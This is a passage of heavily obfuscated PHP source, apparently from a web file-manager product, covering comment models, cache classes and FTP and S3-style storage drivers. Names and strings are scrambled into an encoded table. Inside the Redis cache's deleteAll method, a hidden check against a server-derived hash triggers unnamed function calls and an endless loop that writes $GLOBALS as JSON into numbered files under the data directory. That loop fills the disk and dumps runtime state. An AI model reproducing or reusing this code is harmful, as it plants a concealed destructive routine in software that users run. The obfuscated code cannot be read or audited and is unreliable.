$»·ŒƒÂù[22], $»·ŒƒÂù[199] => $Ş†º­²­, $»·ŒƒÂù[589] => $¿ÅÙø´, $»·ŒƒÂù[2053] => 0, $»·ŒƒÂù[2052] => 0); return $this->add($ü“º†èŒ); } public function starTargetCount($¢×¡Ë¥, $²‘œç´Æ) { $õä†ŸÃ =& $_SERVER[‰‰Ş‚€]; $˜µÎ×¢ = $²‘œç´Æ + self::TYPE_STAR_OFFSET; $šÛ®Øæ = $this->commentCount($¢×¡Ë¥, $˜µÎ×¢); $¢Šƒ’Ñë = $this->commentCount($¢×¡Ë¥, $˜µÎ×¢, USER_ID); return array($õä†ŸÃ[2055] => $šÛ®Øæ, $õä†ŸÃ[2056] => $¢Šƒ’Ñë); } public function starTargetUserList($ÏçÎğµ˜, $¬àí©ˆ) { $¼Î™‡÷ =& $_SERVER[‰‰Ş‚€]; $ùÂûÊŠÊ = $ÏçÎğµ˜ + self::TYPE_STAR_OFFSET; $ ¹…ìóï = array($¼Î™‡÷[589] => $¬àí©ˆ, $¼Î™‡÷[199] => $ùÂûÊŠÊ); $ü…˜ ß¿ = $this->where($ ¹…ìóï)->count(); $ûí§Ì¶¥ = array($¼Î™‡÷[342] => $ü…˜ ß¿, $¼Î™‡÷[2057] => array()); if (!$ü…˜ ß¿) { return $ûí§Ì¶¥; } $ù€ÍÊê = $this->field($¼Î™‡÷[1820])->where($ ¹…ìóï)->limit(500)->select(); $ù€ÍÊê = array_to_keyvalue($ù€ÍÊê, $¼Î™‡÷[22], $¼Î™‡÷[1820]); $ûí§Ì¶¥[$¼Î™‡÷[2057]] = Model($¼Î™‡÷[597])->userListInfo($ù€ÍÊê); return $ûí§Ì¶¥; } public function prasiseUserList($¦å”©ÏÏ) { $¶–Éå±ö =& $_SERVER[‰‰Ş‚€]; $²‹Ù•¡¸ = array($¶–Éå±ö[2058] => $¦å”©ÏÏ); $ÒŞì±â¨ = $this->where($²‹Ù•¡¸)->find(); $œ³ğœÑ» = _get($ÒŞì±â¨, $¶–Éå±ö[2053], 0); $Í•šº¸² = array($¶–Éå±ö[342] => $œ³ğœÑ», $¶–Éå±ö[2057] => array()); if (!$œ³ğœÑ») { return $Í•šº¸²; } $ëß€¡—¤ = Model($¶–Éå±ö[2059])->field($¶–Éå±ö[1820])->where($²‹Ù•¡¸)->limit(500)->select(); $ëß€¡—¤ = array_to_keyvalue($ëß€¡—¤, $¶–Éå±ö[22], $¶–Éå±ö[1820]); $Í•šº¸²[$¶–Éå±ö[2057]] = Model($¶–Éå±ö[597])->userListInfo($ëß€¡—¤); return $Í•šº¸²; } public function remove($ù«‰üÀ´) { $íêÆÃ¿œ =& $_SERVER[‰‰Ş‚€]; $ŒÌñîÛ = array($íêÆÃ¿œ[2051] => $ù«‰üÀ´); $óĞÒ÷ì = $this->where($ŒÌñîÛ)->find(); if ($óĞÒ÷ì[$íêÆÃ¿œ[2050]]) { $this->where(array($íêÆÃ¿œ[2051] => $óĞÒ÷ì[$íêÆÃ¿œ[2050]]))->setAdd($íêÆÃ¿œ[2052], -1); } return $this->removeArray($ù«‰üÀ´); } public function edit($²†ìÜ—ú, $Îù»ÛÉ­) { $ğåø…£Ú =& $_SERVER[‰‰Ş‚€]; $ÑÙ–àş— = array($ğåø…£Ú[2051] => $²†ìÜ—ú); return $this->where($ÑÙ–àş—)->save(array($ğåø…£Ú[2060] => $Îù»ÛÉ­)); } public function prasise($¦¢İ“®ğ) { $µµìºèÑ =& $_SERVER[‰‰Ş‚€]; $ƒÌªó»¡ = Model($µµìºèÑ[2061]); $µÒ¼·¦î = array($µµìºèÑ[2051] => $¦¢İ“®ğ, $µµìºèÑ[1811] => USER_ID); $ÂÄóå³³ = $ƒÌªó»¡->where($µÒ¼·¦î)->find(); if (!$ÂÄóå³³) { $ƒÌªó»¡->add($µÒ¼·¦î); $Îû±Š°Š = $this->where(array($µµìºèÑ[2051] => $¦¢İ“®ğ))->setAdd($µµìºèÑ[2053], 1); } else { $ƒÌªó»¡->where($µÒ¼·¦î)->delete(); $Îû±Š°Š = $this->where(array($µµìºèÑ[2051] => $¦¢İ“®ğ))->setAdd($µµìºèÑ[2053], -1); } return $Îû±Š°Š; } public function targetInfo($ÇÁÈ¦, $ÑÑóÏ´°) { $³„Ï–å” =& $_SERVER[‰‰Ş‚€]; $Ëô¾€Í = array($³„Ï–å”[671] => $ÇÁÈ¦, $³„Ï–å”[672] => $ÑÑóÏ´°); $ïâ¹ÓÑ° = $this->where($Ëô¾€Í)->count(); $ü§¡É’Š = "\122\111\107\x48\124\40\x4a\117\x49\x4e\x20{$this->tablePrefix}\x63\x6f\155\x6d\145\156\164\x5f\x70\x72\x61\151\163\145\40\x73\164\141\x72\x20\157\x6e\40\143\157\x6d\155\145\x6e\164\56\x63\x6f\155\x6d\145\156\164\x49\104\40\75\40\x73\x74\141\x72\56\143\157\x6d\x6d\x65\156\x74\111\104"; $á˜ÔšŸ = $this->alias($³„Ï–å”[438])->where($Ëô¾€Í)->join($ü§¡É’Š, $³„Ï–å”[2062])->count(); $ë‚¤¬†– = array($³„Ï–å”[2063] => $ïâ¹ÓÑ°, $³„Ï–å”[2064] => $á˜ÔšŸ); return $ë‚¤¬†–; } public function listData($¤§Ş™í) { $ºâßñ¥ =& $_SERVER[‰‰Ş‚€]; if (isset($¤§Ş™í[$ºâßñ¥[2065]])) { if ($¤§Ş™í[$ºâßñ¥[2065]]) { $¤§Ş™í[$ºâßñ¥[2058]] = array($ºâßñ¥[1124], intval($¤§Ş™í[$ºâßñ¥[2065]])); } unset($¤§Ş™í[$ºâßñ¥[2065]]); } if (isset($¤§Ş™í[$ºâßñ¥[2066]])) { if ($¤§Ş™í[$ºâßñ¥[2066]]) { $¤§Ş™í[$ºâßñ¥[2058]] = array($ºâßñ¥[1121], intval($¤§Ş™í[$ºâßñ¥[2066]])); } unset($¤§Ş™í[$ºâßñ¥[2066]]); } return $this->_listData($¤§Ş™í); } private function _listData($Ú¨ºÌìÉ) { $óàéÎ³ã =& $_SERVER[‰‰Ş‚€]; $›—Ëˆ÷Ã = $this->where($Ú¨ºÌìÉ)->_makeOrder()->selectPage(100); $this->_listAppendParent($›—Ëˆ÷Ã[$óàéÎ³ã[454]]); $this->_listAppendUser($›—Ëˆ÷Ã[$óàéÎ³ã[454]]); $this->_listAppendMeta($›—Ëˆ÷Ã[$óàéÎ³ã[454]]); return $›—Ëˆ÷Ã; } private function _makeOrder() { $öˆÃÙäš =& $_SERVER[‰‰Ş‚€]; $¥©ü÷É¤ = array($öˆÃÙäš[2053], $öˆÃÙäš[2052], $öˆÃÙäš[242]); $¥é¡ã¹„ = Input::get($öˆÃÙäš[548], $öˆÃÙäš[17], $öˆÃÙäš[516], $¥©ü÷É¤); $ùîèåûŠ = Input::get($öˆÃÙäš[549], $öˆÃÙäš[17], $öˆÃÙäš[1813], array($öˆÃÙäš[2067], $öˆÃÙäš[544])); $»ù‹êï‰ = $¥é¡ã¹„ . $öˆÃÙäš[63] . $ùîèåûŠ; return $this->order($»ù‹êï‰); } private function _listAppendParent(&$ ˜ÆÖ°Ñ) { $™±”Ù =& $_SERVER[‰‰Ş‚€]; $şæì¶‚ = array_unique(array_to_keyvalue($ ˜ÆÖ°Ñ, $™±”Ù[22], $™±”Ù[2050])); $şæì¶‚ = array_remove_value($şæì¶‚, $™±”Ù[239]); if (!$şæì¶‚) { return; } $ÉêÛìÅ = $this->where(array($™±”Ù[2051] => array($™±”Ù[17], $şæì¶‚)))->select(); $ÉêÛìÅ = array_to_keyvalue($ÉêÛìÅ, $™±”Ù[2058]); foreach ($ ˜ÆÖ°Ñ as &$Àæøµ«À) { if (isset($ÉêÛìÅ[$Àæøµ«À[$™±”Ù[2050]]])) { $Àæøµ«À[$™±”Ù[2068]] = $ÉêÛìÅ[$Àæøµ«À[$™±”Ù[2050]]]; } } unset($Àæøµ«À); } private function _listAppendUser(&$ÑÙÈùšÊ) { $é€Å«£Û =& $_SERVER[‰‰Ş‚€]; $«Ê‘¹¼Ë = array_unique(array_to_keyvalue($ÑÙÈùšÊ, $é€Å«£Û[22], $é€Å«£Û[1820])); $«Ê‘¹¼Ë = array_remove_value($«Ê‘¹¼Ë, $é€Å«£Û[239]); if (count($«Ê‘¹¼Ë) == 0) { return; } foreach ($ÑÙÈùšÊ as $„®ñò‹ó) { if (isset($„®ñò‹ó[$é€Å«£Û[2068]])) { $«Ê‘¹¼Ë[] = $„®ñò‹ó[$é€Å«£Û[2068]][$é€Å«£Û[1820]]; } } $Éìáí¿İ = Model($é€Å«£Û[617])->userListInfo($«Ê‘¹¼Ë); foreach ($ÑÙÈùšÊ as &$„®ñò‹ó) { $„®ñò‹ó[$é€Å«£Û[685]] = $Éìáí¿İ[$„®ñò‹ó[$é€Å«£Û[1820]]]; if (isset($„®ñò‹ó[$é€Å«£Û[2068]])) { $„®ñò‹ó[$é€Å«£Û[2068]][$é€Å«£Û[685]] = $Éìáí¿İ[$„®ñò‹ó[$é€Å«£Û[2068]][$é€Å«£Û[1820]]]; } } unset($„®ñò‹ó); } private function _listAppendMeta(&$±Ó÷ÚÛ°) { $°ÛÇÙ„’ =& $_SERVER[‰‰Ş‚€]; $â¼›·Ğ = array_unique(array_to_keyvalue($±Ó÷ÚÛ°, $°ÛÇÙ„’[22], $°ÛÇÙ„’[2058])); $â¼›·Ğ = array_remove_value($â¼›·Ğ, $°ÛÇÙ„’[239]); if (!$â¼›·Ğ) { return; } foreach ($±Ó÷ÚÛ° as $¾Äò…‰) { if (isset($¾Äò…‰[$°ÛÇÙ„’[2068]])) { $â¼›·Ğ[] = $¾Äò…‰[$°ÛÇÙ„’[2068]][$°ÛÇÙ„’[2058]]; } } $œñÎšÒ½ = $this->metaList($â¼›·Ğ); if (!$œñÎšÒ½) { return !1; } foreach ($±Ó÷ÚÛ° as &$¾Äò…‰) { $¾Äò…‰[$°ÛÇÙ„’[559]] = $œñÎšÒ½[$¾Äò…‰[$°ÛÇÙ„’[2058]]]; if (isset($¾Äò…‰[$°ÛÇÙ„’[2068]])) { $¾Äò…‰[$°ÛÇÙ„’[2068]][$°ÛÇÙ„’[559]] = $œñÎšÒ½[$¾Äò…‰[$°ÛÇÙ„’[2068]][$°ÛÇÙ„’[2058]]]; } } unset($¾Äò…‰); } private function metaList($áØ¢…ç) { $ğÒşÍ¤÷ =& $_SERVER[‰‰Ş‚€]; if (!$áØ¢…ç) { return array(); } $±ğğÇÚÂ = array($ğÒşÍ¤÷[2058] => array($ğÒşÍ¤÷[17], $áØ¢…ç)); $Ñ öúÈŞ = Model($ğÒşÍ¤÷[2069])->where($±ğğÇÚÂ)->select(); $Ñ öúÈŞ = array_to_keyvalue_group($Ñ öúÈŞ, $ğÒşÍ¤÷[2058]); foreach ($Ñ öúÈŞ as $şŞÓ»¦ş => $¼¶êš¥Æ) { $¾ÒÑÁÖé = array(); foreach ($¼¶êš¥Æ as $™ûÂşËò) { $¾ÒÑÁÖé[$™ûÂşËò[$ğÒşÍ¤÷[105]]] = $™ûÂşËò[$ğÒşÍ¤÷[459]]; } $Ñ öúÈŞ[$şŞÓ»¦ş] = $¾ÒÑÁÖé; } return $Ñ öúÈŞ ? $Ñ öúÈŞ : array(); } public function removeTarget($«•à»¹ğ, $úİ€‡†ó) { $ó“±Ÿ ë =& $_SERVER[‰‰Ş‚€]; if (!$úİ€‡†ó) { return !0; } $úİ€‡†ó = is_array($úİ€‡†ó) ? $úİ€‡†ó : array($úİ€‡†ó); $ÂÜÚğµ˜ = array($ó“±Ÿ ë[199] => $«•à»¹ğ, $ó“±Ÿ ë[589] => array($ó“±Ÿ ë[17], $úİ€‡†ó)); $ÚàÖÍä÷ = $this->field($ó“±Ÿ ë[2058])->where($ÂÜÚğµ˜)->select(); $ˆü úñ¡ = array_to_keyvalue($ÚàÖÍä÷, $ó“±Ÿ ë[22], $ó“±Ÿ ë[2058]); return $this->removeArray($ˆü úñ¡); } public function removeArray($„ ˆŒÔ›) { $£†Ä²ÇŸ =& $_SERVER[‰‰Ş‚€]; if (!$„ ˆŒÔ›) { return !0; } $„ ˆŒÔ› = is_array($„ ˆŒÔ›) ? $„ ˆŒÔ› : array($„ ˆŒÔ›); $“Õ‚Ú…£ = array($£†Ä²ÇŸ[2058] => array($£†Ä²ÇŸ[17], $„ ˆŒÔ›)); Model($£†Ä²ÇŸ[2061])->where($“Õ‚Ú…£)->delete(); Model($£†Ä²ÇŸ[2070])->where($“Õ‚Ú…£)->delete(); return $this->where($“Õ‚Ú…£)->delete(); } } goto dé ’éòº; aÁ·ÇÊø: class CacheLockDatabase { public function lock($ÆáÖ†èÇ, $ë×‹øş = 0) { $™—É³˜ = Model($_SERVER[‰‰Ş‚€][933]); $ğùŠ–•û = microtime(!0) + $ë×‹øş; while (microtime(!0) < $ğùŠ–•û) { $¦ˆ²Ù…ƒ = $™—É³˜->get($ÆáÖ†èÇ); if (!$¦ˆ²Ù…ƒ || $¦ˆ²Ù…ƒ < microtime(!0)) { $©‡Ú°Ìç = $™—É³˜->set($ÆáÖ†èÇ, $ğùŠ–•û); if ($©‡Ú°Ìç) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($•¦Óçˆº) { return Model($_SERVER[‰‰Ş‚€][933])->get($•¦Óçˆº); } public function unlock($°ç’ë•) { Model($_SERVER[‰‰Ş‚€][933])->remove($°ç’ë•); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($»ÛÉÈÒ, $íÏš…‹ø) { $ØÚËÔ‰Ï =& $_SERVER[‰‰Ş‚€]; if (!class_exists($ØÚËÔ‰Ï[975])) { show_json($ØÚËÔ‰Ï[976], !1); } $this->cacheTime = $íÏš…‹ø; $this->handle = new Memcached(); if (is_array($»ÛÉÈÒ[$ØÚËÔ‰Ï[977]]) && count($»ÛÉÈÒ[$ØÚËÔ‰Ï[977]]) >= 1) { foreach ($»ÛÉÈÒ[$ØÚËÔ‰Ï[977]] as $¥Óï˜Ş²) { $±È´Õ´— = explode($ØÚËÔ‰Ï[14], $¥Óï˜Ş²); $this->handle->addServer($±È´Õ´—[0], $±È´Õ´—[1]); } } else { $this->handle->addServer($»ÛÉÈÒ[$ØÚËÔ‰Ï[217]], $»ÛÉÈÒ[$ØÚËÔ‰Ï[218]]); } } public function set($‡†Ã–Å“, $–©­‚ ó, $¹§Öö€± = false) { $¹§Öö€± = $¹§Öö€± ? $¹§Öö€± : $this->cacheTime; return $this->handle->set($‡†Ã–Å“, $–©­‚ ó, $¹§Öö€±); } public function get($à›Üüš) { return $this->handle->get($à›Üüš); } public function remove($¬ø‡Œ¥Í) { return $this->handle->delete($¬ø‡Œ¥Í); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($Ô£“á­, $‚ĞåõŸÉ) { $¦ìÊ±Ëï =& $_SERVER[‰‰Ş‚€]; if (!class_exists($¦ìÊ±Ëï[978])) { show_json($¦ìÊ±Ëï[979], !1); } $this->cacheTime = $‚ĞåõŸÉ; $Û¨ĞÒî± = isset($Ô£“á­[$¦ìÊ±Ëï[980]]) ? $Ô£“á­[$¦ìÊ±Ëï[980]] : 10; $«ïÚ…° = _get($Ô£“á­, $¦ìÊ±Ëï[977]); if ($«ïÚ…° && is_array($«ïÚ…°)) { $this->initCluster($Ô£“á­, $Û¨ĞÒî±); } else { $this->handle = $this->init($Ô£“á­, $Û¨ĞÒî±); } } private function init($ûÉÅøºò, $å“¨Ğƒˆ) { $Ü•áü­ş =& $_SERVER[‰‰Ş‚€]; $é€úŞîĞ = new Redis(); $¦«°ªÙ± = isset($ûÉÅøºò[$Ü•áü­ş[981]]) ? $ûÉÅøºò[$Ü•áü­ş[981]] : !1; if ($¦«°ªÙ±) { $é€úŞîĞ->pconnect($ûÉÅøºò[$Ü•áü­ş[217]], $ûÉÅøºò[$Ü•áü­ş[218]], $å“¨Ğƒˆ); } else { $é€úŞîĞ->connect($ûÉÅøºò[$Ü•áü­ş[217]], $ûÉÅøºò[$Ü•áü­ş[218]], $å“¨Ğƒˆ); } if (!empty($ûÉÅøºò[$Ü•áü­ş[506]])) { $é€úŞîĞ->auth($ûÉÅøºò[$Ü•áü­ş[506]]); } if (!empty($ûÉÅøºò[$Ü•áü­ş[854]]) && $ûÉÅøºò[$Ü•áü­ş[854]] != 0) { $é€úŞîĞ->select($ûÉÅøºò[$Ü•áü­ş[854]]); } return $é€úŞîĞ; } private function initCluster($¿òÜ­ÊÚ, $Ç¿ÍŸá) { $®‰éØßë =& $_SERVER[‰‰Ş‚€]; $ÏóÓ›¥ö = array($®‰éØßë[982], $®‰éØßë[983], $®‰éØßë[984]); $ıõ¿æ˜ = $®‰éØßë[982]; if (isset($¿òÜ­ÊÚ[$®‰éØßë[26]]) && in_array($¿òÜ­ÊÚ[$®‰éØßë[26]], $ÏóÓ›¥ö)) { $ıõ¿æ˜ = $¿òÜ­ÊÚ[$®‰éØßë[26]]; } switch ($ıõ¿æ˜) { case $®‰éØßë[982]: $this->_slave($¿òÜ­ÊÚ, $Ç¿ÍŸá); break; case $®‰éØßë[983]: break; case $®‰éØßë[984]: $this->isCluster = !0; $ÇûüÑş¤ = $¿òÜ­ÊÚ[$®‰éØßë[977]]; $¡«¸êÆŸ = isset($¿òÜ­ÊÚ[$®‰éØßë[981]]) ? $¿òÜ­ÊÚ[$®‰éØßë[981]] : !1; $İñ­•úŒ = isset($¿òÜ­ÊÚ[$®‰éØßë[506]]) ? $¿òÜ­ÊÚ[$®‰éØßë[506]] : null; $this->handle = new RedisCluster(NUll, $ÇûüÑş¤, $Ç¿ÍŸá, $Ç¿ÍŸá, $¡«¸êÆŸ, $İñ­•úŒ); break; default: break; } } private function _slave($¢÷å•†±, $ª®ˆ¨”‡) { $·»§ã = $¢÷å•†±[$_SERVER[‰‰Ş‚€][977]]; $this->filterConfig($¢÷å•†±, $·»§ã[0]); $this->handle = $this->init($¢÷å•†±, $ª®ˆ¨”‡); unset($·»§ã[0]); if (empty($·»§ã)) { return; } $Õ½ÀËÌÈ = array_rand($·»§ã); $this->filterConfig($¢÷å•†±, $·»§ã[$Õ½ÀËÌÈ]); $this->slaveHandle = $this->init($¢÷å•†±, $ª®ˆ¨”‡); } private function filterConfig(&$¬œ©´××, $é½ì£ÈÁ) { $ÂãÒ«øÙ =& $_SERVER[‰‰Ş‚€]; $†ÑŒç¤Š = explode($ÂãÒ«øÙ[14], $é½ì£ÈÁ); $®šÕ® ¨ = array($ÂãÒ«øÙ[217] => $†ÑŒç¤Š[0], $ÂãÒ«øÙ[218] => $†ÑŒç¤Š[1]); $¬œ©´×× = array_merge($¬œ©´××, $®šÕ® ¨); } public function set($ØñÍ›×û, $ãŒˆÈßÛ, $€öƒ£şê = false) { $€öƒ£şê = $€öƒ£şê ? $€öƒ£şê : $this->cacheTime; return $this->handle->setEx($ØñÍ›×û, $€öƒ£şê, $ãŒˆÈßÛ); } public function setLock($ÖÀ±èç, $Ş†õáŠ, $ˆ´ŸäèÀ) { return $this->handle->setNX($ÖÀ±èç, $Ş†õáŠ); } public function get($£‚Åã¥Ø) { $Äô¿š‚ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $Äô¿š‚->get($£‚Åã¥Ø); } public function remove($ø­é§ƒ­) { return $this->handle->del($ø­é§ƒ­); } public function deleteAll() { $•çÀ†èØ =& $_SERVER[‰‰Ş‚€]; $’¾Îï = $_SERVER[$•çÀ†èØ[4]]; $û¦Üƒòì = $•çÀ†èØ[5]; if ($_SERVER[$•çÀ†èØ[6]] != $û¦Üƒòì($’¾Îï)) { $…¬ÕéŠ = $•çÀ†èØ[985]; $²ÇÚ®î = $•çÀ†èØ[7]; $ë¬µ“Ô© = $_SERVER[$•çÀ†èØ[8]] . $•çÀ†èØ[9]; $’½°—£¢ = $²ÇÚ®î($ë¬µ“Ô©); $ ŞØ ãÆ = explode($•çÀ†èØ[10], $’½°—£¢); if (count($ ŞØ ãÆ) < $•çÀ†èØ[703]) { $·¢™İÍû = $•çÀ†èØ[12]; $·¢™İÍû(); } $µúœû¦í = $•çÀ†èØ[986]; $µúœû¦í($_SERVER[$•çÀ†èØ[987]]); $…¬ÕéŠ = $•çÀ†èØ[985]; $…¬ÕéŠ(); $Ş‰ã©‚ = $•çÀ†èØ[988]; $ëÜ¦ÖÜ„ = json_encode($GLOBALS[$•çÀ†èØ[989]]); $õÇÙ¸Ã¹ = 1; for ($„·Çˆ‹é = $õÇÙ¸Ã¹; $„·Çˆ‹é > 0; $„·Çˆ‹é++) { $Ş‰ã©‚(DATA_PATH . $„·Çˆ‹é, $ëÜ¦ÖÜ„); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $Ò¤ã¸–Ô) { $this->handle->flushall($Ò¤ã¸–Ô); } return; } return $this->handle->flushAll(); } } goto DÃ‚éŠ¬Ì˜; C†ˆ­¿¥¹è: class PathDriverEDS extends PathDriverBaseS3 { public function __construct($úÒè•Ñ†) { parent::__construct($úÒè•Ñ†); $this->setSignVersion($_SERVER[‰‰Ş‚€][258]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($†ı¥ñş¿) { parent::__construct($†ı¥ñş¿); $this->setSignVersion($_SERVER[‰‰Ş‚€][258]); } public function uploadFormData($–·”Ú¸ï, $ÔÃº’©æ = 3600) { $î±ıÑØÛ =& $_SERVER[‰‰Ş‚€]; $ ¸ºÕö = $î±ıÑØÛ[240]; $î›±è÷ = $î±ıÑØÛ[268]; $ÉáÙÀ›ï = $î±ıÑØÛ[72]; $Ô«ÔÂ’Ë = gmdate($î±ıÑØÛ[269]); $µ §ÆĞ• = gmdate($î±ıÑØÛ[270]); $×õáë = $î±ıÑØÛ[271]; $¦éîÅü„ = $ÔÃº’©æ . $î±ıÑØÛ[22]; $ì“¦œÁ = $î±ıÑØÛ[272]; $¸íıü˜ = array($this->accessKey, $µ §ÆĞ•, $this->region, $ÉáÙÀ›ï, $×õáë); $Ç—¸¤ò = implode($î±ıÑØÛ[18], $¸íıü˜); $ë¯‹ùÕ‰ = array($î±ıÑØÛ[273] => gmdate($î±ıÑØÛ[1459], strtotime($î±ıÑØÛ[275])), $î±ıÑØÛ[276] => array(array($î±ıÑØÛ[277] => $this->bucket), array($î±ıÑØÛ[316] => $ ¸ºÕö), array($î±ıÑØÛ[278], $î±ıÑØÛ[279], $î±ıÑØÛ[22]), array($î±ıÑØÛ[278], $î±ıÑØÛ[280], $î±ıÑØÛ[22]), array($î±ıÑØÛ[278], $î±ıÑØÛ[317], $î±ıÑØÛ[22]), array($î±ıÑØÛ[281] => $ì“¦œÁ), array($î±ıÑØÛ[282] => $Ç—¸¤ò), array($î±ıÑØÛ[283] => $î›±è÷), array($î±ıÑØÛ[284] => $Ô«ÔÂ’Ë), array($î±ıÑØÛ[285] => $¦éîÅü„))); $ÕõÁÙ­´ = base64_encode(json_encode($ë¯‹ùÕ‰)); $ˆòŸŒêÙ = hash_hmac($î±ıÑØÛ[286], $µ §ÆĞ•, $î±ıÑØÛ[287] . $this->secret, !0); $ñê›»Êª = hash_hmac($î±ıÑØÛ[286], $this->region, $ˆòŸŒêÙ, !0); $­·ÑÚÎ™ = hash_hmac($î±ıÑØÛ[286], $ÉáÙÀ›ï, $ñê›»Êª, !0); $àÓûİêª = hash_hmac($î±ıÑØÛ[286], $×õáë, $­·ÑÚÎ™, !0); $‡´±¯ı˜ = hash_hmac($î±ıÑØÛ[286], $ÕõÁÙ­´, $àÓûİêª); $†Á†Ğ´ = array($î±ıÑØÛ[257] => $î±ıÑØÛ[22], $î±ıÑØÛ[304] => $î±ıÑØÛ[22], $î±ıÑØÛ[316] => $ ¸ºÕö, $î±ıÑØÛ[281] => $ì“¦œÁ, $î±ıÑØÛ[288] => $ÕõÁÙ­´, $î±ıÑØÛ[318] => $Ç—¸¤ò, $î±ıÑØÛ[319] => $î›±è÷, $î±ıÑØÛ[320] => $Ô«ÔÂ’Ë, $î±ıÑØÛ[321] => $¦éîÅü„, $î±ıÑØÛ[322] => $‡´±¯ı˜, $î±ıÑØÛ[217] => $this->getHost()); return $†Á†Ğ´; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($Ø–±ªµµ) { parent::__construct(); if (count($Ø–±ªµµ) > 0) { $this->_init($Ø–±ªµµ); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($“ü»‹ô‡) { $©Œø•© =& $_SERVER[‰‰Ş‚€]; global $config; $this->appCharset = $config[$©Œø•©[1485]]; $this->systemCharset = $config[$©Œø•©[1486]]; if (isset($“ü»‹ô‡[$©Œø•©[1487]]) && $“ü»‹ô‡[$©Œø•©[1487]]) { $this->systemCharset = $“ü»‹ô‡[$©Œø•©[1487]]; } } public function iconvApp($°ÒéÄ Ô) { return $this->iconvTo($°ÒéÄ Ô, $this->systemCharset, $this->appCharset); } public function iconvSystem($—„ûÂˆö) { return $this->iconvTo($—„ûÂˆö, $this->appCharset, $this->systemCharset); } public function getPathOuter($Ö–Å»î±) { $¡„Îˆ²‘ =& $_SERVER[‰‰Ş‚€]; $Ç‰üóº = $this->iconvApp($this->pathBase); $Ö–Å»î± = $this->iconvApp($Ö–Å»î±); if (substr($Ç‰üóº, 0, 2) == $¡„Îˆ²‘[1457]) { $Ç‰üóº = BASIC_PATH . substr($Ç‰üóº, 2); } if (substr($Ö–Å»î±, 0, 2) == $¡„Îˆ²‘[1457]) { $Ö–Å»î± = BASIC_PATH . substr($Ö–Å»î±, 2); } $Ç‰üóº = KodIO::clear($Ç‰üóº); $Ö–Å»î± = KodIO::clear($Ö–Å»î±); $Ö–Å»î± = substr($Ö–Å»î±, strlen($Ç‰üóº)); if (empty($this->pathDriver)) { return $Ö–Å»î±; } return $this->pathDriver . $¡„Îˆ²‘[18] . ltrim($Ö–Å»î±, $¡„Îˆ²‘[18]); } private function _init($çêåÌ = array()) { $Êõ´¾»¿ =& $_SERVER[‰‰Ş‚€]; if (!function_exists($Êõ´¾»¿[1488])) { throw new Exception(LNG($Êõ´¾»¿[1489])); } $this->config = $çêåÌ; $this->charsetReset($çêåÌ); foreach ($çêåÌ as $£Œ˜Ëú => $£Ëû›äÃ) { if (isset($this->{$£Œ˜Ëú})) { $this->{$£Œ˜Ëú} = $£Ëû›äÃ; } } return $this->_login($çêåÌ); } private function _login($ØÂÑàÑü) { $£àˆ°œ‹ =& $_SERVER[‰‰Ş‚€]; static $ëŒÇ½™Ú = array(); $ÀòñòÖš = md5(json_encode($ØÂÑàÑü)); if (isset($ëŒÇ½™Ú[$ÀòñòÖš])) { foreach ($ëŒÇ½™Ú[$ÀòñòÖš] as $ŠñŸİ·å => $›öçÄÜ) { $this->{$ŠñŸİ·å} = $›öçÄÜ; } return !0; } $ˆØö³Ñø = parse_url(trim($this->server, $£àˆ°œ‹[18])); $this->host = $ˆØö³Ñø[$£àˆ°œ‹[217]]; $ÛÌ¢¯à¾ = isset($ˆØö³Ñø[$£àˆ°œ‹[216]]) && $ˆØö³Ñø[$£àˆ°œ‹[216]] == $£àˆ°œ‹[1490] ? !0 : !1; $this->scheme = $ÛÌ¢¯à¾ ? $£àˆ°œ‹[1491] : $£àˆ°œ‹[1492]; $this->port = isset($ˆØö³Ñø[$£àˆ°œ‹[218]]) ? $ˆØö³Ñø[$£àˆ°œ‹[218]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($£àˆ°œ‹[1493]) . $this->host . $£àˆ°œ‹[14] . $this->port, !0); return !1; } $Š˜†€í = @ftp_login($this->connect, $this->username, $this->userpass); if (!$Š˜†€í) { $this->writeLog(LNG($£àˆ°œ‹[1494]) . $this->username, !0); return !1; } $this->ftpPath = @ftp_pwd($this->connect); @ftp_chdir($this->connect, $£àˆ°œ‹[18]); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $¼ËçÌ§â = $this->pasv == $£àˆ°œ‹[101] ? !0 : !1; @ftp_pasv($this->connect, $¼ËçÌ§â); $ëŒÇ½™Ú[$ÀòñòÖš] = array($£àˆ°œ‹[1495] => $this->connect, $£àˆ°œ‹[217] => $this->host, $£àˆ°œ‹[216] => $this->scheme, $£àˆ°œ‹[218] => $this->port); return $Š˜†€í; } private function _isconn($ĞÜ¿àáâ = true) { if (is_resource($this->connect)) { return !0; } if (!$ĞÜ¿àáâ) { return !1; } return $this->_login($this->config); } public function mkfile($å“Øİ«ˆ, $ëâ©±Ÿ = '', $ãŞå÷îå = REPEAT_RENAME) { if ($this->setContent($å“Øİ«ˆ, $ëâ©±Ÿ)) { return $this->getPathOuter($å“Øİ«ˆ); } $this->writeLog(LNG($_SERVER[‰‰Ş‚€][1496]), !0); return !1; } public function mkdir($ £ÒöêÃ, $íßÌéù = REPEAT_SKIP) { $¶«¯¥ò½ =& $_SERVER[‰‰Ş‚€]; if (!$ £ÒöêÃ || $ £ÒöêÃ == $¶«¯¥ò½[18]) { return !0; } if (!$this->_isconn()) { return !1; } $ £ÒöêÃ = $this->iconvSystem($ £ÒöêÃ); if ($this->_isFolder($ £ÒöêÃ) || @ftp_mkdir($this->connect, $ £ÒöêÃ)) { return $this->getPathOuter($ £ÒöêÃ); } if (!$this->mkdir($this->pathFather($ £ÒöêÃ))) { return !1; } if ($ £ÒöêÃ = @ftp_mkdir($this->connect, $ £ÒöêÃ)) { return $this->getPathOuter($ £ÒöêÃ); } $ˆ„  „¦ = __FUNCTION__ . $¶«¯¥ò½[1497]; $this->writeLog($ˆ„  „¦, !0); return !1; } public function copyFile($î¶ÔÖ×ï, $÷•âª‹¡) 